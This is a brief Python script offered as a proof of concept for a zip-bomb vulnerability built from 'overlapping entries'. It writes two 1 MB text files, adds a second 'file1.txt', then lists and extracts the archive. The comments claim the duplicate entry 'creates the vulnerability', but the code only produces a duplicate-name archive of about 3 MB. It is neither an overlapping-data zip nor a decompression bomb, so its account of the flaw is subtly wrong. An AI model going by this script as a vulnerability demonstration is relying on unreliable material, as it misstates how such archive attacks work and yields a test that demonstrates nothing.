import zipfile
import io

# Create a zip file that demonstrates the vulnerability
with zipfile.ZipFile('vulnerable.zip', 'w') as zf:
    # Create a zip bomb with overlapping entries
    zf.writestr('file1.txt', b'A' * (10**6))  # 1 MB file
    zf.writestr('file2.txt', b'B' * (10**6))  # 1 MB file
    # Overlapping entry (this creates the vulnerability)
    zf.writestr('file1.txt', b'A' * (10**6))  # Overlapping entry

# Attempt to read the vulnerable zip file (this may cause issues in vulnerable versions)
with zipfile.ZipFile('vulnerable.zip', 'r') as zf:
    print(zf.namelist())
    zf.extractall('extracted_files')